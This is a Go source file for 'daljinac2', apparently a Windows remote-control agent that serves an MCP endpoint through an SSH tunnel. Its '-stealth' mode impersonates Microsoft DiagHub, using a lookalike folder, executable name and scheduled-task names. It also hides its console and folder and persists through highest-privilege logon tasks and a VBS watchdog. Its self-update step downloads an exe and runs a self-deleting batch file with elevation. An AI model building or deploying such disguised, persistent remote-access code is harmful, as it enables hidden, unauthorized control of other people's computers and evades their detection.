package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"github.com/egzakutacno/daljinac2/internal/auth"
	"github.com/egzakutacno/daljinac2/internal/tunnel"
	daljinacmcp "github.com/egzakutacno/daljinac2/internal/mcp"
	"github.com/egzakutacno/daljinac2/tray"
)

const version = "2.0.0-dev.20260718.2"
const maxLogSize = 1 * 1024 * 1024
const mcpPort = 1984
const originalExeName = "daljinac2.exe"

var isStealth bool

const (
	stealthDir       = "C:\\ProgramData\\Microsoft\\DiagHub"
	stealthExeName   = "DiagHubHost.exe"
	stealthTaskName  = "MicrosoftDiagHubCollect"
	stealthWatchName = "MicrosoftDiagHubWatch"
)

var logFile *os.File

func initLog() {
	var logDir string
	if isStealth {
		os.MkdirAll(stealthDir, 0755)
		logDir = stealthDir
	} else {
		logDir = filepath.Join(os.Getenv("ProgramData"), "daljinac2")
		if err := os.MkdirAll(logDir, 0755); err != nil {
			logDir = "C:\\daljinac2"
			os.MkdirAll(logDir, 0755)
		}
	}
	logName := "daljinac2.log"
	if isStealth {
		logName = "diaghub.log"
	}
	logPath := filepath.Join(logDir, logName)
	if fi, err := os.Stat(logPath); err == nil && fi.Size() > maxLogSize {
		os.Rename(logPath, logPath+".old")
	}
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("WARN: cannot open log %s: %v", logPath, err)
		return
	}
	logFile = f
	log.SetOutput(f)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Printf("=== daljinac2 v%s starting ===", version)
	syncLog()
}

func syncLog() {
	if logFile != nil {
		logFile.Sync()
	}
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	user32 := syscall.NewLazyDLL("user32.dll")
	showWindow := user32.NewProc("ShowWindow")
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

func writeStartupMarker() {
	dir := "C:\\daljinac2"
	if isStealth {
		dir = stealthDir
	}
	os.MkdirAll(dir, 0755)
	os.WriteFile(filepath.Join(dir, "started.txt"), []byte(time.Now().Format(time.RFC3339)+"\n"), 0644)
}

func logExec(cmdName string, args ...string) error {
	cmd := exec.Command(cmdName, args...)
	out, err := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	if err != nil {
		log.Printf("[exec] FAILED: %s %v | output: %s | err: %v", cmdName, args, outStr, err)
	} else if outStr != "" {
		log.Printf("[exec] OK: %s %v | output: %s", cmdName, args, outStr)
	} else {
		log.Printf("[exec] OK: %s %v", cmdName, args)
	}
	syncLog()
	return err
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			b := make([]byte, 4096)
			n := runtime.Stack(b, true)
			log.Printf("PANIC: %v\n%s", r, b[:n])
			syncLog()
		}
	}()
	writeStartupMarker()
	initLog()
	hideConsole()
	time.Sleep(2 * time.Second)

	// Check os.Args for -install / -remove / -stealth BEFORE flag.Parse
	for _, a := range os.Args {
		if a == "-stealth" {
			isStealth = true
		}
		if a == "-install" {
			doInstall()
			syncLog()
			return
		}
		if a == "-remove" {
			doRemove()
			syncLog()
			return
		}
	}

	port := flag.Int("port", mcpPort, "MCP server port")
	noTray := flag.Bool("notray", false, "No system tray")
	flag.Parse()

	// Stealth forces no-tray
	if isStealth {
		*noTray = true
	}

	log.Printf("=== daljinac2 v%s process start ===", version)
	log.Printf("Args: %v", os.Args)
	syncLog()

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Printf("Port %d in use - another instance running. Exiting.", *port)
		syncLog()
		return
	}

	shutdown := make(chan struct{})
	hostname, _ := os.Hostname()
	log.Printf("Hostname: %s, Version: %s, Port: %d, Tray: %v", hostname, version, *port, !*noTray)
	syncLog()

	// Create MCP server
	mcpServer := daljinacmcp.NewDMCPServer(version)
	httpHandler := daljinacmcp.NewStreamableHTTPServer(mcpServer, "/mcp")
	authHandler := auth.Middleware(httpHandler)

	directMux := http.NewServeMux()
	directMux.Handle("/mcp", authHandler)
	directMux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"running","version":"%s"}`, version)
	})
	directMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"agent":"daljinac2","version":"%s","status":"running"}`, version)
	})

	// Setup tray
	tr := tray.New(hostname, version)
	tr.OnRestartTunnel = func() {
		log.Println("[main] restarting tunnel not supported yet")
	}
	tr.OnExit = func() {
		log.Println("[main] OnExit triggered - shutting down")
		syncLog()
		close(shutdown)
	}

	onConnect := func(url string) {
		log.Printf("[main] tunnel connected: %s", url)
		syncLog()
		tr.SetURL(url)
		tr.SetRunning()
		tr.SetStatusIcon(tray.IconConnected)
	}

	if !*noTray {
		time.Sleep(3 * time.Second)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[tray] PANIC: %v", r)
					syncLog()
				}
			}()
			log.Println("[main] starting tray goroutine")
			syncLog()
			tr.Run()
			log.Println("[main] tray goroutine exited")
			syncLog()
		}()
	} else {
		log.Println("Headless mode")
		syncLog()
	}

	// Start MCP HTTP server
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[http] PANIC: %v", r)
				syncLog()
			}
		}()
		log.Printf("Starting MCP Streamable HTTP server on %s", ln.Addr().String())
		syncLog()
		if err := http.Serve(ln, directMux); err != nil {
			log.Printf("[http] server error: %v", err)
			syncLog()
		}
	}()

	// Start SSH tunnel
	t := tunnel.NewSSH(*port, hostname, onConnect)
	t.Start()
	log.Println("[main] SSH tunnel started")
	syncLog()

	// Watchdog: exit if tunnel not connected for 30 minutes
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			if t == nil {
				continue
			}
			since := time.Since(t.LastConnected())
			log.Printf("[watchdog] check: last connected %v ago", since)
			if since > 30*time.Minute {
				log.Printf("[watchdog] tunnel not connected for %v, exiting (task will restart)", since)
				syncLog()
				os.Exit(1)
			}
		}
	}()

	if *noTray {
		select {}
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-shutdown:
		log.Println("[main] shutdown via OnExit")
	case s := <-sig:
		log.Printf("[main] shutdown via signal: %v", s)
	}
	syncLog()

	log.Println("[main] cleaning up...")
	syncLog()
	if t != nil {
		t.Stop()
	}
	tr.Stop()
	log.Println("[main] done")
	syncLog()
}

func doInstall() {
	exe, err := os.Executable()
	if err != nil {
		log.Printf("[install] os.Executable failed: %v", err)
		return
	}
	log.Printf("[install] binary: %s", exe)

	dir := "C:\\daljinac2"
	taskName := "Daljinac2"
	watchName := "Daljinac2Watch"
	if isStealth {
		dir = stealthDir
		taskName = stealthTaskName
		watchName = stealthWatchName
	}
	os.MkdirAll(dir, 0755)

	// Write watchdog VBS
	vbsFile := filepath.Join(dir, "watchdog.vbs")
	vbs := fmt.Sprintf("CreateObject(\"WScript.Shell\").Run \"schtasks /run /tn %s\", 0, False\n", taskName)
	if err := os.WriteFile(vbsFile, []byte(vbs), 0644); err != nil {
		log.Printf("[install] write watchdog.vbs failed: %v", err)
	} else {
		log.Println("[install] watchdog.vbs written")
	}

	// Remove old tasks (both normal and stealth variants)
	logExec("schtasks", "/delete", "/tn", "Daljinac2", "/f")
	logExec("schtasks", "/delete", "/tn", "Daljinac2Watch", "/f")
	logExec("schtasks", "/delete", "/tn", stealthTaskName, "/f")
	logExec("schtasks", "/delete", "/tn", stealthWatchName, "/f")

	// Build task command line with stealth flag if needed
	taskCmd := exe
	if isStealth {
		taskCmd = fmt.Sprintf("%s -stealth", exe)
	}

	// Create main task with /it (Interactive) so tray works
	if err := logExec("schtasks", "/create", "/tn", taskName, "/tr", taskCmd,
		"/sc", "ONLOGON", "/it", "/rl", "HIGHEST", "/f"); err != nil {
		log.Printf("[install] FAILED to create %s task: %v", taskName, err)
	} else {
		log.Printf("[install] %s task created", taskName)
	}

	// Create watchdog task
	if err := logExec("schtasks", "/create", "/tn", watchName,
		"/tr", fmt.Sprintf("wscript.exe //B %s", vbsFile),
		"/sc", "MINUTE", "/mo", "5", "/f"); err != nil {
		log.Printf("[install] FAILED to create %s task: %v", watchName, err)
	} else {
		log.Printf("[install] %s task created", watchName)
	}

	// Clean up old Run registry key (prevents double-start)
	if k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE); err == nil {
		k.DeleteValue("Daljinac2")
		k.Close()
		log.Println("[install] old Run registry key removed (cleanup)")
	}

	// Hide folder in stealth mode
	if isStealth {
		exec.Command("attrib", "+h", "+s", dir).Run()
		log.Println("[install] stealth folder hidden (+h +s)")
	}

	syncLog()

	// Start the app
	if err := logExec("cmd", "/c", "start", "", "/min", exe); err != nil {
		log.Printf("[install] start app failed: %v", err)
	} else {
		log.Println("[install] app started")
	}
	syncLog()
}

func doRemove() {
	exeName := "daljinac2.exe"
	taskName := "Daljinac2"
	watchName := "Daljinac2Watch"
	if isStealth {
		exeName = stealthExeName
		taskName = stealthTaskName
		watchName = stealthWatchName
	}
	logExec("taskkill", "/f", "/im", exeName)
	logExec("schtasks", "/delete", "/tn", taskName, "/f")
	logExec("schtasks", "/delete", "/tn", watchName, "/f")

	// Also remove non-stealth tasks (cleanup both)
	if isStealth {
		logExec("schtasks", "/delete", "/tn", "Daljinac2", "/f")
		logExec("schtasks", "/delete", "/tn", "Daljinac2Watch", "/f")
	} else {
		logExec("schtasks", "/delete", "/tn", stealthTaskName, "/f")
		logExec("schtasks", "/delete", "/tn", stealthWatchName, "/f")
	}

	if k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE); err == nil {
		k.DeleteValue("Daljinac2")
		k.Close()
	}

	dir := "C:\\daljinac2"
	if isStealth {
		dir = stealthDir
	}
	os.Remove(filepath.Join(dir, "watchdog.vbs"))
	log.Println("[remove] done")
	syncLog()
}

func updateURL() string {
	return "https://github.com/egzakutacno/daljinac2/releases/latest/download/" + originalExeName
}

func doUpdate() error {
	tmpDir := filepath.Join(os.TempDir(), "daljinac2-update")
	os.MkdirAll(tmpDir, 0755)

	dlURL := updateURL()
	newExe := filepath.Join(tmpDir, filepath.Base(os.Args[0]))
	log.Printf("[update] downloading %s", dlURL)
	resp, err := http.Get(dlURL)
	if err != nil {
		return fmt.Errorf("download: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	out, _ := os.Create(newExe)
	io.Copy(out, resp.Body)
	out.Close()

	current, _ := os.Executable()

	argsFile := filepath.Join(tmpDir, "args.txt")
	stealthArg := ""
	if isStealth {
		stealthArg = " -stealth"
	}
	fullCmd := fmt.Sprintf(`"%s"%s`, current, stealthArg)
	os.WriteFile(argsFile, []byte(fullCmd), 0644)

	taskName := "Daljinac2"
	watchName := "Daljinac2Watch"
	vbsPath := "C:\\daljinac2\\watchdog.vbs"
	if isStealth {
		taskName = stealthTaskName
		watchName = stealthWatchName
		vbsPath = stealthDir + "\\watchdog.vbs"
	}

	logFile := filepath.Join(tmpDir, "update.log")
	bat := filepath.Join(tmpDir, "up.bat")
	batch := fmt.Sprintf(`@echo off
set LOG="%s"
echo %%date%% %%time%% [update] starting >> %%LOG%%
set /p CMD=<"%s"
echo %%date%% %%time%% [update] copying new binary >> %%LOG%%
copy /y "%s" "%s" >> %%LOG%% 2>&1
if %%errorlevel%% neq 0 (
    echo %%date%% %%time%% [update] COPY FAILED >> %%LOG%%
    exit /b 1
)
echo %%date%% %%time%% [update] copy OK, killing >> %%LOG%%
taskkill /f /im daljinac2.exe >> %%LOG%% 2>&1
taskkill /f /im %s >> %%LOG%% 2>&1
timeout /t 2 /nobreak > nul
echo %%date%% %%time%% [update] writing vbs >> %%LOG%%
echo CreateObject("WScript.Shell").Run "schtasks /run /tn %s", 0, False > "%s"
echo %%date%% %%time%% [update] registering tasks >> %%LOG%%
schtasks /delete /tn "%s" /f >> %%LOG%% 2>&1
schtasks /create /tn "%s" /tr "%%CMD%%" /sc ONLOGON /rl HIGHEST /f >> %%LOG%% 2>&1
echo %%date%% %%time%% [update] starting app >> %%LOG%%
schtasks /run /tn "%s" >> %%LOG%% 2>&1
for /l %%i in (1,1,3) do (
  timeout /t 5 /nobreak > nul
  tasklist /fi "imagename eq %s" 2>nul | find /i "%s" >nul
  if not errorlevel 1 goto RUNNING
  start "" /min %%CMD%% >> %%LOG%% 2>&1
)
:RUNNING
schtasks /delete /tn "%s" /f >> %%LOG%% 2>&1
schtasks /create /tn "%s" /tr "wscript.exe //B %s" /sc MINUTE /mo 5 /f >> %%LOG%% 2>&1
echo %%date%% %%time%% [update] done >> %%LOG%%
del "%s"
del "%%~f0"
`, logFile, argsFile, newExe, current,
		stealthExeName,
		taskName, vbsPath,
		taskName, taskName,
		taskName,
		stealthExeName, strings.TrimSuffix(stealthExeName, ".exe"),
		watchName, watchName, vbsPath,
		argsFile)
	os.WriteFile(bat, []byte(batch), 0644)

	shell32 := syscall.NewLazyDLL("shell32.dll")
	se := shell32.NewProc("ShellExecuteW")
	se.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("cmd"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("/C \""+bat+"\""))),
		0, 0)

	log.Println("[update] launched, exiting")
	syncLog()
	os.Exit(0)
	return nil
}
